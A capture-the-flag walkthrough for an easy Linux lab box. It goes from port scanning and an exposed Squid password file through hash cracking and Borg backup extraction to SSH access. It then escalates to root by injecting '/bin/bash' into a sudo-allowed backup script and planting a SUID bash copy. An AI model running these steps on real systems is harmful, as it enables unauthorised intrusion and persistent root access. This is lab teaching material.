# cyborgt8

**Status:** Completed
**Target:** `$TARGET`
**OS:** Linux
**Difficulty:** Easy

## Recon

```bash
# What it does: execute a full TCP port scan using a fast SYN approach.
# Why here: map the open ports on the target.
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent

# What it does: perform service version detection and default script scanning on discovered ports.
# Why here: identify the versions of SSH and Apache running on the host.
nmap -sVC -p22,80 $TARGET -oN service 
```

**Output**
```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

## Enumeration

```bash
# What it does: brute-force directories on the web server.
# Why here: discover hidden directories, admin panels, or configuration backups.
feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/big.txt 
```

**Output**
```text
200      GET       15l       74w     6143c http://10.130.139.207/icons/ubuntu-logo.png
200      GET      375l      968w    11321c http://10.130.139.207/
301      GET        9l       28w      316c http://10.130.139.207/admin => http://10.130.139.207/admin/
301      GET        9l       28w      314c http://10.130.139.207/etc => http://10.130.139.207/etc/
200      GET        1l        1w       52c http://10.130.139.207/etc/squid/passwd
200      GET        6l       27w      258c http://10.130.139.207/etc/squid/squid.conf
```

### Investigating Exposed Configuration Files

The `/etc` directory is exposed on the web server, leaking Squid proxy configurations.

```bash
# What it does: retrieve the exposed squid.conf and passwd files via HTTP.
# Why here: read the proxy configuration and extract the authentication hashes.
curl http://$TARGET/etc/squid/squid.conf
curl http://$TARGET/etc/squid/passwd
```

**Output**
```text
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
passwd->
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.                     
```

### Retrieving the Archive

```bash
# What it does: download the archive.tar file discovered in the /admin directory.
# Why here: retrieve the backup file for local analysis.
curl http://10.130.139.207/admin/archive.tar -o archiver.tar
```

### Cracking the Hash

```bash
# What it does: crack the extracted Apache MD5 hash using hashcat and rockyou.
# Why here: recover the plaintext password needed for the music_archive user or related services.
echo '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > hash_only.txt
hashcat -m 1600 hash_only.txt /usr/share/wordlists/rockyou.txt
```
**Cracked password:** `squidward`

## Borg Backup Repository Extraction

The `.tar` file downloaded previously contains a Borg Backup repository.

```bash
# What it does: install the borgbackup utility and list the contents of the local repository.
# Why here: identify the backup archives available for extraction.
sudo apt install borgbackup -y
borg list .
```
*Note: It prompts for a passphrase. Providing the cracked password `squidward` grants access.*

```bash
# What it does: list the contents of the specific 'music_archive' within the Borg repository.
# Why here: verify the archive contents before extraction.
borg list .::music_archive

# What it does: extract the Borg backup archive to the local directory.
# Why here: retrieve the backed-up files, which include a user's home directory.
borg extract .::music_archive
cd home/alex
```

The backup contained the `/home/alex` directory.

```bash
# What it does: read the notes file found in the extracted backup.
# Why here: discover plaintext credentials stored by the user.
cat home/alex/Documents/note.txt
```

**Output**
```text
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
alex:S3cretP@s3
```

### Initial Access

Using the recovered credentials, connect via SSH.

```bash
# What it does: authenticate via SSH using the discovered credentials and enumerate sudo privileges.
# Why here: establish a foothold on the target and identify potential privilege escalation vectors.
ssh alex@$TARGET
id
sudo -l
```

**Output**
```text
uid=1000(alex) gid=1000(alex) groups=1000(alex),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)

(ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

## Privilege Escalation

Analyzing the backup script:

```bash
# What it does: read the source code of the privileged backup script.
# Why here: identify vulnerabilities such as command injection or insecure paths.
cat /etc/mp3backups/backup.sh
```

The script contains a line `cmd=$($command)` which is vulnerable to command injection if `$command` is attacker-controlled via arguments.

```bash
# What it does: execute the backup script with sudo, injecting /bin/bash via the -c parameter.
# Why here: exploit the command injection vulnerability to execute arbitrary commands as root.
sudo /etc/mp3backups/backup.sh -c "/bin/bash"

# What it does: copy the bash binary and set the SUID bit.
# Why here: the injected shell does not echo output, so creating a SUID bash binary allows for an interactive root shell upon exit.
cp /bin/bash /tmp/rootbash
chmod 4777 /tmp/rootbash
exit

# What it does: execute the SUID bash binary to gain a root shell.
# Why here: complete the privilege escalation to root.
/tmp/rootbash -p
id
cat /root/root.txt
```

## Related Notes
- [nmap](../../../tools/recon/nmap.md)
- [feroxbuster](../../../tools/fuzz/feroxbuster.md)
- [curl](../../../tools/web/curl.md)
- [hashcat](../../../tools/creds/hashcat.md)
- [borg](../../../tools/recon/borg.md)